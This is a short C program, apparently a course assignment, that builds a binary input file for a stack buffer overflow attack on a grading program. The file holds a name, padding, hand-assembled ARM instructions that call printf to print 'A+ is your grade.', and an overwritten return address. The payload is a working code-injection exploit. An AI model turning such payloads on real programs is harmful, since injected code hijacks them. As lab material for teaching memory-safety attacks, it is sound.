/* Authors: Rohan Amin and Alex Luo 
   createdataAplus.c */
#include <stdio.h>
#include "miniassembler.h"

int main(void) {
   FILE *psFile;
   int i;
   unsigned int mov, adr, branch, bl;
   unsigned long movLocation;
   psFile = fopen("dataAplus", "w");
   fputs("Rolex",psFile);   
   putc('\0', psFile);

   fputs("A+ is your grade.\n",psFile); 

   for (i = 0; i < 8; i++)
      putc('\0', psFile);    
   
   /* printf parameters  */
   adr = MiniAssembler_adr(0, 0x42005e, 0x42007c);
   mov = MiniAssembler_mov(1, 0);
   bl = MiniAssembler_bl(0x4005e0, 0x420080);
   branch = MiniAssembler_b(0x400874,0x420084);  
   movLocation = 0x420078; 
      
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&mov, sizeof(unsigned int), 1, psFile); 
   fwrite(&bl, sizeof(unsigned int), 1, psFile);
   fwrite(&branch, sizeof(unsigned int), 1, psFile);
   fwrite (&movLocation, sizeof(unsigned long), 1, psFile);
   fclose(psFile);
   return 0;

}
